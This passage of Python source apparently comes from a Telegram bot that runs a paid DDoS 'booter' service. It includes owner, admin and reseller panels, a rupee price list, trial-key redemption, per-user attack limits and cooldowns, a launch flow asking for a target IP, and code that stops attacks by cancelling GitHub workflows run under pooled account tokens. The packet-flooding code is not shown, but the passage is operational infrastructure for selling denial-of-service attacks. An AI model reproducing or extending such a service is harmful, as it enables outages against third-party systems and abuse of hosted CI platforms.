        user_role = "💰 ʀᴇꜱᴇʟʟᴇʀ"
    else:
        user_role = "👤 ᴀᴘᴘʀᴏᴠᴇᴅ ᴜꜱᴇʀ"

    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks

    attack_status = get_attack_status()
    status_text = ""

    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        status_text = (
            f"\n\n🔥 ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ\n"
            f"ᴛᴀʀɢᴇᴛ: `{attack['ip']}:{attack['port']}`\n"
            f"ʀᴇᴍᴀɪɴɪɴɢ: `{attack_status['remaining']}ꜱ`"
        )
    elif attack_status["status"] == "cooldown":
        status_text = f"\n\n⏳ ᴄᴏᴏʟᴅᴏᴡɴ: `{attack_status['remaining_cooldown']}ꜱ`"

    message = (
        f"🤖 ᴍᴀɪɴ ᴍᴇɴᴜ\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{user_role}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎯 ʀᴇᴍᴀɪɴɪɴɢ ᴀᴛᴛᴀᴄᴋꜱ: {remaining_attacks}/{MAX_ATTACKS}\n"
        f"📊 ꜱᴛᴀᴛᴜꜱ: {'🟢 ʀᴇᴀᴅʏ' if attack_status['status'] == 'ready' else '🔴 ʙᴜꜱʏ'}"
        f"{status_text}\n\n"
        f"ᴜꜱᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ:"
    )

    reply_markup = get_main_keyboard(user_id)
    await update.message.reply_text(message, reply_markup=reply_markup)


async def show_user_management(update: Update, user_id):
    """Display user management panel"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ")
        return

    message = (
        "👥 ᴜꜱᴇʀ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "ᴍᴀɴᴀɢᴇ ᴜꜱᴇʀꜱ, ᴀᴘᴘʀᴏᴠᴀʟꜱ, ᴀɴᴅ ᴛʀɪᴀʟ ᴋᴇʏꜱ\n\n"
        "ꜱᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ:"
    )

    reply_markup = get_user_management_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)


async def show_bot_settings(update: Update, user_id):
    """Display bot settings panel"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ")
        return

    message = (
        "⚙️ ʙᴏᴛ ꜱᴇᴛᴛɪɴɢꜱ\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔧 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ: {'ᴏɴ' if MAINTENANCE_MODE else 'ᴏꜰꜰ'}\n"
        f"⏱️ ᴄᴏᴏʟᴅᴏᴡɴ: {COOLDOWN_DURATION}ꜱ\n"
        f"🎯 ᴍᴀx ᴀᴛᴛᴀᴄᴋꜱ: {MAX_ATTACKS}\n\n"
        "ꜱᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ:"
    )

    reply_markup = get_bot_settings_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)


async def show_owner_panel(update: Update, user_id):
    """Display owner panel"""
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ")
        return

    message = (
        "👑 ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "ᴏᴡɴᴇʀ-ᴏɴʟʏ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ ᴏᴘᴛɪᴏɴꜱ\n\n"
        "ꜱᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ:"
    )

    reply_markup = get_owner_panel_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)


async def show_token_management(update: Update, user_id):
    """Display token management panel"""
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ")
        return

    message = (
        "🔑 ᴛᴏᴋᴇɴ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"ᴛᴏᴛᴀʟ ꜱᴇʀᴠᴇʀꜱ: {len(github_tokens)}\n\n"
        "ꜱᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ:"
    )

    reply_markup = get_token_management_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)


async def launch_attack_start(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    """Initialize attack launch process"""
    if not can_user_attack(user_id):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝\n\n"
            "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴀᴛᴛᴀᴄᴋ."
        )
        return

    can_start, message = can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(message)
        return

    if not github_tokens:
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ❌  ɴᴏ ꜱᴇʀᴠᴇʀꜱ      ║\n"
            "╚══════════════════════════╝\n\n"
            "ɴᴏ ꜱᴇʀᴠᴇʀꜱ ᴀᴠᴀɪʟᴀʙʟᴇ.\n"
            "ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ."
        )
        return

    temp_data[user_id] = {"step": "attack_ip"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "╔════════════════════════════════════╗\n"
        "║  🎯  ʟᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ - ꜱᴛᴇᴘ 1/3  ║\n"
        "╚════════════════════════════════════╝\n"
        "┌────────────────────────────────────┐\n"
        "│  ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ɪᴘ:   │\n"
        "└────────────────────────────────────┘",
        reply_markup=reply_markup
    )


async def check_status(update: Update, user_id):
    """Check current attack status"""
    if not can_user_attack(user_id):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    attack_status = get_attack_status()

    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        message = (
            "╔════════════════════════════════╗\n"
            "║  🔥  ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ        ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            f"│  🌐  ᴛᴀʀɢᴇᴛ:  {attack['ip']}:{attack['port']} │\n"
            f"│  ⏱️  ᴇʟᴀᴘꜱᴇᴅ:  {attack_status['elapsed']}ꜱ      │\n"
            f"│  ⏳  ʀᴇᴍᴀɪɴɪɴɢ:  {attack_status['remaining']}ꜱ  │\n"
            f"│  ⚡  ᴍᴇᴛʜᴏᴅ:  {attack['method']}              │\n"
            "└────────────────────────────────┘"
        )
    elif attack_status["status"] == "cooldown":
        message = (
            "╔════════════════════════════════╗\n"
            "║  ⏳  ᴄᴏᴏʟᴅᴏᴡɴ ᴘᴇʀɪᴏᴅ       ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            f"│  ⏳  ʀᴇᴍᴀɪɴɪɴɢ:  {attack_status['remaining_cooldown']}ꜱ  │\n"
            f"│  ⏰  ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ ɪɴ:  {attack_status['remaining_cooldown']}ꜱ │\n"
            "└────────────────────────────────┘"
        )
    else:
        message = (
            "╔════════════════════════════════╗\n"
            "║  ✅  ꜱʏꜱᴛᴇᴍ ʀᴇᴀᴅʏ          ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            "│  ɴᴏ ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ.         │\n"
            "│  ʏᴏᴜ ᴄᴀɴ ꜱᴛᴀʀᴛ ᴀ ɴᴇᴡ ᴏɴᴇ.  │\n"
            "└────────────────────────────────┘"
        )

    await update.message.reply_text(message)

async def stop_attack_handler(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    """Handle attack stopping process"""
    if not can_user_attack(user_id):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    attack_status = get_attack_status()

    if attack_status["status"] != "running":
        await update.message.reply_text(
            "╔══════════════════════════════╗\n"
            "║  ❌  ɴᴏ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ   ║\n"
            "╚══════════════════════════════╝\n\n"
            "ɴᴏ ᴀᴛᴛᴀᴄᴋ ɪꜱ ᴄᴜʀʀᴇɴᴛʟʏ ʀᴜɴɴɪɴɢ."
        )
        return

    if not github_tokens:
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ❌  ɴᴏ ꜱᴇʀᴠᴇʀꜱ      ║\n"
            "╚══════════════════════════╝\n\n"
            "ɴᴏ ꜱᴇʀᴠᴇʀꜱ ᴀʀᴇ ᴀᴠᴀɪʟᴀʙʟᴇ."
        )
        return

    await update.message.reply_text(
        "╔══════════════════════════════╗\n"
        "║  🛑  ꜱᴛᴏᴘᴘɪɴɢ ᴀᴛᴛᴀᴄᴋ...  ║\n"
        "╚══════════════════════════════╝"
    )

    total_stopped = 0
    success_count = 0

    threads = []
    results = []

    def stop_single_token(token_data):
        try:
            stopped = instant_stop_all_jobs(
                token_data['token'],
                token_data['repo']
            )
            results.append((token_data['username'], stopped))
        except Exception as e:
            results.append((token_data['username'], 0))

    for token_data in github_tokens:
        thread = threading.Thread(target=stop_single_token, args=(token_data,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        await asyncio.to_thread(thread.join)

    for username, stopped in results:
        total_stopped += stopped
        if stopped > 0:
            success_count += 1

    stop_attack()

    message = (
        "╔════════════════════════════════╗\n"
        "║  🛑  ᴀᴛᴛᴀᴄᴋ ꜱᴛᴏᴘᴘᴇᴅ        ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        f"│  ✅  ᴡᴏʀᴋꜰʟᴏᴡꜱ ᴄᴀɴᴄᴇʟʟᴇᴅ: {total_stopped}  │\n"
        f"│  ✅  ꜱᴇʀᴠᴇʀꜱ:  {success_count}/{len(github_tokens)}            │\n"
        f"│  ⏳  ᴄᴏᴏʟᴅᴏᴡɴ:  {COOLDOWN_DURATION}ꜱ            │\n"
        "└────────────────────────────────┘"
    )

    await update.message.reply_text(message)


async def my_access(update: Update, user_id):
    """Display user access information"""
    if is_owner(user_id):
        if is_primary_owner(user_id):
            role = "👑 ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀ"
        else:
            role = "👑 ᴏᴡɴᴇʀ"
        expiry = "ʟɪꜰᴇᴛɪᴍᴇ"
    elif is_admin(user_id):
        role = "🛡️ ᴀᴅᴍɪɴ"
        expiry = "ʟɪꜰᴇᴛɪᴍᴇ"
    elif is_reseller(user_id):
        role = "💰 ʀᴇꜱᴇʟʟᴇʀ"
        reseller_data = resellers.get(str(user_id), {})
        expiry = reseller_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "ᴇxᴘɪʀᴇᴅ"
                else:
                    expiry_date = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                    expiry = expiry_date
            except Exception:
                pass
    elif is_approved_user(user_id):
        role = "👤 ᴀᴘᴘʀᴏᴠᴇᴅ ᴜꜱᴇʀ"
        user_data = approved_users.get(str(user_id), {})
        expiry = user_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "ᴇxᴘɪʀᴇᴅ"
                else:
                    expiry_date = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                    expiry = expiry_date
            except Exception:
                pass
    else:
        role = "⏳ ᴘᴇɴᴅɪɴɢ"
        expiry = "ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ"

    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks
    
    username = update.effective_user.username or 'ɴᴏ ᴜꜱᴇʀɴᴀᴍᴇ'

    message = (
        "╔════════════════════════════════╗\n"
        "║  🔐  ʏᴏᴜʀ ᴀᴄᴄᴇꜱꜱ ɪɴꜰᴏ      ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        f"│  👤  ʀᴏʟᴇ:       {role:<18} │\n"
        f"│  🆔  ᴜꜱᴇʀ ɪᴅ:   {user_id:<16} │\n"
        f"│  📛  ᴜꜱᴇʀɴᴀᴍᴇ:  @{username:<15} │\n"
        f"│  📅  ᴇxᴘɪʀʏ:     {expiry:<18} │\n"
        f"│  🎯  ʀᴇᴍᴀɪɴɪɴɢ:  {remaining_attacks}/{MAX_ATTACKS:<9} │\n"
        "├────────────────────────────────┤\n"
        f"│  🚀  ᴀᴛᴛᴀᴄᴋ ᴀᴄᴄᴇꜱꜱ:  {'✅ ʏᴇꜱ' if can_user_attack(user_id) else '❌ ɴᴏ'} │\n"
        "└────────────────────────────────┘"
    )

    await update.message.reply_text(message)

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeem trial key: /redeem TRL-XXXX-XXXX-XXXX"""
    user_id = update.effective_user.id

    if not context.args:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  🔑  ʀᴇᴅᴇᴇᴍ ᴛʀɪᴀʟ ᴋᴇʏ       ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            "│  ᴜꜱᴀɢᴇ:                       │\n"
            "│  `/redeem TRL-XXXX-XXXX-XXXX`  │\n"
            "└────────────────────────────────┘"
        )
        return

    key = context.args[0].strip().upper()
    success, msg = redeem_trial_key(key, user_id)

    if success:
        await update.message.reply_text(
            f"╔════════════════════════════════╗\n"
            f"║  ✅  ᴛʀɪᴀʟ ᴀᴄᴛɪᴠᴀᴛᴇᴅ        ║\n"
            f"╚════════════════════════════════╝\n"
            f"┌────────────────────────────────┐\n"
            f"│  {msg[:30]:<30} │\n"
            f"└────────────────────────────────┘",
            reply_markup=get_main_keyboard(user_id)
        )
    else:
        await update.message.reply_text(
            f"╔════════════════════════════════╗\n"
            f"║  ❌  ʀᴇᴅᴇᴇᴍ ꜰᴀɪʟᴇᴅ         ║\n"
            f"╚════════════════════════════════╝\n"
            f"┌────────────────────────────────┐\n"
            f"│  {msg[:30]:<30} │\n"
            f"└────────────────────────────────┘"
        )
        


async def add_user_start(update: Update, user_id):
    """Start add user process"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    temp_data[user_id] = {"step": "add_user_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  ➕  ᴀᴅᴅ ᴜꜱᴇʀ - ꜱᴛᴇᴘ 1/2   ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        "│  ꜱᴇɴᴅ ᴛʜᴇ ᴜꜱᴇʀ ɪᴅ:          │\n"
        "│                                │\n"
        "│  ᴇxᴀᴍᴘʟᴇ:  `123456789`        │\n"
        "└────────────────────────────────┘",
        reply_markup=reply_markup
    )


async def remove_user_start(update: Update, user_id):
    """Start remove user process"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    temp_data[user_id] = {"step": "remove_user_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  ➖  ʀᴇᴍᴏᴠᴇ ᴜꜱᴇʀ            ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        "│  ꜱᴇɴᴅ ᴛʜᴇ ᴜꜱᴇʀ ɪᴅ ᴛᴏ ʀᴇᴍᴏᴠᴇ: │\n"
        "│                                │\n"
        "│  ᴇxᴀᴍᴘʟᴇ:  `123456789`        │\n"
        "└────────────────────────────────┘",
        reply_markup=reply_markup
    )


async def users_list(update: Update, user_id):
    """Display list of approved users"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    if not approved_users:
        await update.message.reply_text(
            "╔══════════════════════════════╗\n"
            "║  📭  ɴᴏ ᴀᴘᴘʀᴏᴠᴇᴅ ᴜꜱᴇʀꜱ   ║\n"
            "╚══════════════════════════════╝"
        )
        return

    users_list_text = (
        "╔════════════════════════════════╗\n"
        "║  👤  ᴀᴘᴘʀᴏᴠᴇᴅ ᴜꜱᴇʀꜱ ʟɪꜱᴛ  ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
    )
    
    count = 1
    for uid, user_info in list(approved_users.items())[:15]:
        username = user_info.get('username', f'ᴜꜱᴇʀ_{uid}')
        days = user_info.get('days', '?')

        expiry = user_info.get('expiry', 'LIFETIME')
        if expiry == "LIFETIME":
            remaining = "ʟɪꜰᴇᴛɪᴍᴇ"
        else:
            try:
                expiry_time = float(expiry)
                current_time = time.time()
                if current_time > expiry_time:
                    remaining = "ᴇxᴘɪʀᴇᴅ"
                else:
                    days_left = int((expiry_time - current_time) / (24 * 3600))
                    hours_left = int(((expiry_time - current_time) % (24 * 3600)) / 3600)
                    remaining = f"{days_left}ᴅ {hours_left}ʜ"
            except Exception:
                remaining = "ᴜɴᴋɴᴏᴡɴ"

        users_list_text += f"│  {count:2}. `{uid}` - @{username:<12} │\n"
        users_list_text += f"│      ({days}ᴅ) | {remaining:<12} │\n"
        count += 1

    users_list_text += (
        "├────────────────────────────────┤\n"
        f"│  📊 ᴛᴏᴛᴀʟ: {len(approved_users)} ᴜꜱᴇʀꜱ          │\n"
        "└────────────────────────────────┘"
    )
    
    await update.message.reply_text(users_list_text)


async def pending_requests(update: Update, user_id):
    """Display pending user requests"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    if not pending_users:
        await update.message.reply_text(
            "╔══════════════════════════════╗\n"
            "║  📭  ɴᴏ ᴘᴇɴᴅɪɴɢ ʀᴇQᴜᴇꜱᴛꜱ  ║\n"
            "╚══════════════════════════════╝"
        )
        return

    pending_list = (
        "╔════════════════════════════════╗\n"
        "║  ⏳  ᴘᴇɴᴅɪɴɢ ʀᴇQᴜᴇꜱᴛꜱ       ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
    )
    
    for user in pending_users[:20]:
        pending_list += f"│  • `{user['user_id']}` - @{user['username']:<12} │\n"

    pending_list += (
        "├────────────────────────────────┤\n"
        "│  ᴛᴏ ᴀᴘᴘʀᴏᴠᴇ: ᴜꜱᴇ ᴀᴅᴅ ᴜꜱᴇʀ  │\n"
        "└────────────────────────────────┘"
    )
    
    await update.message.reply_text(pending_list)


async def gen_trial_key_start(update: Update, user_id):
    """Start trial key generation"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    keyboard = [
        [
            cbtn("6 Hours",  callback_data="trial_6",  style="success"),
            cbtn("12 Hours", callback_data="trial_12", style="success"),
            cbtn("24 Hours", callback_data="trial_24", style="success"),
        ],
        [
            cbtn("48 Hours", callback_data="trial_48", style="primary"),
            cbtn("72 Hours", callback_data="trial_72", style="primary"),
            cbtn("❌ Cancel", callback_data="cancel_operation", style="danger"),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  🔑  ɢᴇɴᴇʀᴀᴛᴇ ᴛʀɪᴀʟ ᴋᴇʏ    ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        "│  ꜱᴇʟᴇᴄᴛ ᴛʀɪᴀʟ ᴅᴜʀᴀᴛɪᴏɴ:   │\n"
        "└────────────────────────────────┘",
        reply_markup=reply_markup,
    )


async def price_list(update: Update):
    """Display price list"""
    message = (
        "╔════════════════════════════════╗\n"
        "║  💰  ᴘʀɪᴄᴇ ʟɪꜱᴛ              ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        "│  📌  ʀᴇɢᴜʟᴀʀ ᴜꜱᴇʀꜱ:         │\n"
        "│  • 1 ᴅᴀʏ     - ₹120           │\n"
        "│  • 2 ᴅᴀʏꜱ    - ₹240           │\n"
        "│  • 3 ᴅᴀʏꜱ    - ₹360           │\n"
        "│  • 4 ᴅᴀʏꜱ    - ₹450           │\n"
        "│  • 7 ᴅᴀʏꜱ    - ₹650           │\n"
        "├────────────────────────────────┤\n"
        "│  📌  ʀᴇꜱᴇʟʟᴇʀꜱ:              │\n"
        "│  • 1 ᴅᴀʏ     - ₹150           │\n"
        "│  • 2 ᴅᴀʏꜱ    - ₹250           │\n"
        "│  • 3 ᴅᴀʏꜱ    - ₹300           │\n"
        "│  • 4 ᴅᴀʏꜱ    - ₹400           │\n"
        "│  • 7 ᴅᴀʏꜱ    - ₹550           │\n"
        "├────────────────────────────────┤\n"
        "│  📞  ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ᴛᴏ ʙᴜʏ    │\n"
        "└────────────────────────────────┘"
    )
    await update.message.reply_text(message)


async def toggle_maintenance(update: Update, user_id):
    """Toggle maintenance mode"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    global MAINTENANCE_MODE
    MAINTENANCE_MODE = not MAINTENANCE_MODE
    save_maintenance_mode(MAINTENANCE_MODE)

    status = "ᴏɴ" if MAINTENANCE_MODE else "ᴏꜰꜰ"
    icon = "🔴" if MAINTENANCE_MODE else "🟢"
    desc = "ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴇɴᴀʙʟᴇᴅ" if MAINTENANCE_MODE else "ʙᴏᴛ ᴏᴘᴇʀᴀᴛɪᴏɴᴀʟ"

    message = (
        "╔════════════════════════════════╗\n"
        "║  🔧  ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ      ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        f"│  ꜱᴛᴀᴛᴜꜱ:  {icon} {status:<12} │\n"
        f"│  ᴅᴇꜱᴄ:  {desc:<18} │\n"
        "└────────────────────────────────┘"
    )

    await update.message.reply_text(message)


async def set_cooldown_start(update: Update, user_id):
    """Start cooldown setting process"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    keyboard = [
        [
            cbtn("10s", callback_data="cooldown_10", style="primary"),
            cbtn("20s", callback_data="cooldown_20", style="primary"),
            cbtn("30s", callback_data="cooldown_30", style="primary"),
        ],
        [
            cbtn("40s",  callback_data="cooldown_40",  style="success"),
            cbtn("60s",  callback_data="cooldown_60",  style="success"),
            cbtn("120s", callback_data="cooldown_120", style="danger"),
        ],
        [
            cbtn("❌ Cancel", callback_data="cancel_operation", style="danger"),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  ⏱️  ꜱᴇᴛ ᴄᴏᴏʟᴅᴏᴡɴ            ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        f"│  ᴄᴜʀʀᴇɴᴛ:  {COOLDOWN_DURATION}ꜱ            │\n"
        "│                                │\n"
        "│  ꜱᴇʟᴇᴄᴛ ɴᴇᴡ ᴄᴏᴏʟᴅᴏᴡɴ:        │\n"
        "└────────────────────────────────┘",
        reply_markup=reply_markup,
    )


async def set_max_attacks_start(update: Update, user_id):
    """Start max attacks setting process"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    keyboard = [
        [
            cbtn("1",  callback_data="maxattack_1",  style="primary"),
            cbtn("5",  callback_data="maxattack_5",  style="primary"),
            cbtn("10", callback_data="maxattack_10", style="primary"),
        ],
        [
            cbtn("20",  callback_data="maxattack_20",  style="success"),
            cbtn("40",  callback_data="maxattack_40",  style="success"),
            cbtn("100", callback_data="maxattack_100", style="danger"),
        ],
        [
            cbtn("❌ Cancel", callback_data="cancel_operation", style="danger"),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  🎯  ꜱᴇᴛ ᴍᴀx ᴀᴛᴛᴀᴄᴋꜱ      ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        f"│  ᴄᴜʀʀᴇɴᴛ:  {MAX_ATTACKS}               │\n"
        "│                                │\n"
        "│  ꜱᴇʟᴇᴄᴛ ɴᴇᴡ ᴍᴀxɪᴍᴜᴍ:         │\n"
        "└────────────────────────────────┘",
        reply_markup=reply_markup,
    )
    
    
async def admin_list(update: Update, user_id):
    """Display admin list"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    if not admins:
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  📭  ɴᴏ ᴀᴅᴍɪɴꜱ ᴀᴅᴅᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    admin_list_text = (
        "╔════════════════════════════════╗\n"
        "║  🛡️  ᴀᴅᴍɪɴꜱ ʟɪꜱᴛ            ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
    )
    
    for admin_id, admin_info in admins.items():
        username = admin_info.get('username', f'ᴀᴅᴍɪɴ_{admin_id}')
        admin_list_text += f"│  • `{admin_id}` - @{username:<12} │\n"

    admin_list_text += "└────────────────────────────────┘"
    
    await update.message.reply_text(admin_list_text)


async def add_owner_start(update: Update, user_id):
    """Start add owner process"""
    if not is_owner(user_id):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    temp_data[user_id] = {"step": "owner_add_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  👑  ᴀᴅᴅ ᴏᴡɴᴇʀ - ꜱᴛᴇᴘ 1/2  ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        "│  ꜱᴇɴᴅ ᴛʜᴇ ᴜꜱᴇʀ ɪᴅ:          │\n"
        "│                                │\n"
        "│  ᴇxᴀᴍᴘʟᴇ:  `123456789`        │\n"
        "└────────────────────────────────┘",
        reply_markup=reply_markup
    )


async def remove_owner_start(update: Update, user_id):
    """Start remove owner process"""
    if not is_owner(user_id):
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ⚠️  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ   ║\n"
            "╚══════════════════════════╝"
        )
        return

    temp_data[user_id] = {"step": "owner_remove_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  🗑️  ʀᴇᴍᴏᴠᴇ ᴏᴡɴᴇʀ            ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        "│  ꜱᴇɴᴅ ᴛʜᴇ ᴜꜱᴇʀ ɪᴅ:          │\n"
        "│                                │\n"
